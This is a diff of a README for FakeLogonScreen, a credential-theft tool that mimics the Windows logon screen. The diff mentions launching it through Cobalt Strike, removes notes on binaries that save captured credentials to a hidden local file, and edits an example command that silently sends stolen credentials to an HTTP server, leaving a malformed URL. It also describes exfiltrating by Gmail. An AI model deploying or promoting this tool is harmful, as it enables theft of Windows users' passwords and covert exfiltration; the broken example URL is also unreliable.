@@ -4,8 +4,7 @@ FakeLogonScreen is a utility to fake the Windows logon screen in order to obtain
 It can either be executed by simply running the .exe file, or using for example Cobalt Strike's `execute-assembly` command.
 
 Binaries available from the [Releases](https://github.com/diegomardian/fakelogonscreen/releases) page.
-- FakeLogonScreen.exe: Writes output to console which for example is compatible with Cobalt Strike
-- FakeLogonScreenToFile.exe: Writes output to console and `%LOCALAPPDATA%\Microsoft\user.db`
+
 
 Folders:
 - / (root): Built against .NET Framework 4.5 which is installed by default in Windows 8, 8.1 and 10
@@ -31,7 +30,7 @@ FakeLogonScreen accepts these parameters:
 ## Http
 You can create your own server or you can use [DuckyServer](), a pre built server.
 ## Exmaple using DuckyServer
-`FakeLogonScreen.exe http http://127.0.0.1//fake_login_screen silent`
+`FakeLogonScreen.exe http http:/127.0.0.1/fake_login_screen silent`
 ## Gmail
 To use Gmail make sure you go to [https://www.google.com/settings/security/lesssecureapps](https://www.google.com/settings/security/lesssecureapps) and enable "Allow less secure apps" for the account you will use.
 ## Example
